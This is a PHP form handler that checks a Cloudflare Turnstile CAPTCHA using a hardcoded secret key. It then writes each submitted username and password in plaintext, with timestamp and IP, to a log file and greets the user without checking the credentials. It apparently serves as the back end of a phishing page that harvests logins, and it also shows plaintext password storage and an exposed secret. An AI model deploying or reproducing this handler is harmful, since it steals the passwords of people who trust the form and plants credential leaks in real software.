<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = $_POST['cf-turnstile-response'] ?? '';
    if (empty($token)) { die("No CAPTCHA token received."); }

    $secretKey = '0x4AAAAAABlI9GDcRjMEL_2HtynYPPX323Q';
    $remoteIp = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];

    $postData = http_build_query([
        'secret' => $secretKey,
        'response' => $token,
        'remoteip' => $remoteIp
    ]);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://challenges.cloudflare.com/turnstile/v0/siteverify");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    $response = curl_exec($ch);
    curl_close($ch);

    $verification = json_decode($response, true);

    if (!$verification['success']) {
        die("CAPTCHA failed: " . implode(', ', $verification['error-codes'] ?? []));
    }

    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['pswrd']);
    $ip = $remoteIp;
    $timestamp = date("Y-m-d H:i:s");

    $filePath = "/home/albert/logins.txt";
    file_put_contents($filePath, "[$timestamp][$ip] Username: $username, Password: $password\n", FILE_APPEND);

    echo "<h1>Welcome, " . htmlspecialchars($username) . "!</h1>";
} else {
    echo "Invalid request.";
}
?>
